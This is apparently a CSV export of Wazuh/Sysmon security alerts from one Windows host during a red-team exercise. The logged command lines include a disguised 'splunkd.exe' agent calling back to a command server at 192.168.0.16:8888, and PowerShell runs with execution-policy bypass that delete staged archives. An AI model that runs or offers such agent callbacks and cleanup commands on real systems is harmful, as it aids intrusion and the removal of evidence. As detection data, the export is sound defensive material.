timestamp,agent.name,rule.id,rule.level,rule.description,data.win.system.channel,data.win.system.message
"Apr 26, 2025 @ 14:19:00.874","host1_windows1","61109","5","Name resolution for the name wpad timed out","System","""La resolución de nombres para el nombre wpad agotó el tiempo de espera después de que ninguno de los servidores DNS configurados respondiera. PID de cliente 2516."""
"Apr 26, 2025 @ 14:17:25.328","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:17:23.517\r\nProcessGuid: {26d71978-2333-680d-1c05-000000000600}\r\nProcessId: 2192\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_i2vfkcg1.lsn.ps1\r\nCreationUtcTime: 2025-04-26 18:17:23.517\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:17:25.087","host1_windows1","92021","3","Powershell was used to delete files or directories","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:17:23.449\r\nProcessGuid: {26d71978-2333-680d-1c05-000000000600}\r\nProcessId: 2192\r\nImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""Remove-Item -Path \""staged\"" -recurse""\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=BB26646B094923F080FC2F2BA363C4C28B33DC07,MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {26d71978-fd2a-680c-7401-000000000600}\r\nParentProcessId: 5720\r\nParentImage: C:\Users\Public\splunkd.exe\r\nParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://192.168.0.16:8888 -group red \r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:17:23.299","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:17:21.543\r\nProcessGuid: {26d71978-2331-680d-1b05-000000000600}\r\nProcessId: 1120\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_dyqlly40.qiw.ps1\r\nCreationUtcTime: 2025-04-26 18:17:21.543\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:17:23.115","host1_windows1","92021","3","Powershell was used to delete files or directories","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:17:21.425\r\nProcessGuid: {26d71978-2331-680d-1b05-000000000600}\r\nProcessId: 1120\r\nImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""rm C:\Users\usach\staged.zip""\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=BB26646B094923F080FC2F2BA363C4C28B33DC07,MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {26d71978-fd2a-680c-7401-000000000600}\r\nParentProcessId: 5720\r\nParentImage: C:\Users\Public\splunkd.exe\r\nParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://192.168.0.16:8888 -group red \r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:13:53.696","host1_windows1","92154","4","Process loaded taskschd.dll module. May be used to create delayed malware execution","Microsoft-Windows-Sysmon/Operational","""Image loaded:\r\nRuleName: technique_id=T1053,technique_name=Scheduled Task\r\nUtcTime: 2025-04-26 18:13:52.064\r\nProcessGuid: {26d71978-2241-680d-1a05-000000000600}\r\nProcessId: 3196\r\nImage: C:\Windows\System32\sppsvc.exe\r\nImageLoaded: C:\Windows\System32\taskschd.dll\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Task Scheduler COM API\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: taskschd.dll\r\nHashes: SHA1=03D12FA8C05451E741E9DCD1FCE2D91507128AED,MD5=60392F262DDE3734086D0E1D372ED186,SHA256=7A172A93C9DEF92F8C9683209B491C0FE835B3F1AEF257218441761120ED1C0E,IMPHASH=E61FD409CB21E6A6EBA2AFE59848CFC8\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: NT AUTHORITY\Servicio de red"""
"Apr 26, 2025 @ 14:13:52.714","host1_windows1","60642","3","Software protection service scheduled successfully.","Application","""El servicio de protección de software se programó correctamente para reiniciarse a las 2025-06-21T17:41:52Z. Motivo: RulesEngine."""
"Apr 26, 2025 @ 14:13:24.475","host1_windows1","92154","4","Process loaded taskschd.dll module. May be used to create delayed malware execution","Microsoft-Windows-Sysmon/Operational","""Image loaded:\r\nRuleName: technique_id=T1053,technique_name=Scheduled Task\r\nUtcTime: 2025-04-26 18:13:22.822\r\nProcessGuid: {26d71978-2240-680d-1705-000000000600}\r\nProcessId: 7888\r\nImage: C:\Windows\System32\taskhostw.exe\r\nImageLoaded: C:\Windows\System32\taskschd.dll\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Task Scheduler COM API\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: taskschd.dll\r\nHashes: SHA1=03D12FA8C05451E741E9DCD1FCE2D91507128AED,MD5=60392F262DDE3734086D0E1D372ED186,SHA256=7A172A93C9DEF92F8C9683209B491C0FE835B3F1AEF257218441761120ED1C0E,IMPHASH=E61FD409CB21E6A6EBA2AFE59848CFC8\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: NT AUTHORITY\SYSTEM"""
"Apr 26, 2025 @ 14:10:30.069","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:10:28.326\r\nProcessGuid: {26d71978-2194-680d-1605-000000000600}\r\nProcessId: 3864\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_uftncqzi.4pr.ps1\r\nCreationUtcTime: 2025-04-26 18:10:28.326\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:09:28.134","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:09:26.315\r\nProcessGuid: {26d71978-2156-680d-1505-000000000600}\r\nProcessId: 2920\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_hgjfm2jb.t2c.ps1\r\nCreationUtcTime: 2025-04-26 18:09:26.315\r\nUser: DESKTOP-V0J3BBT\usach"""
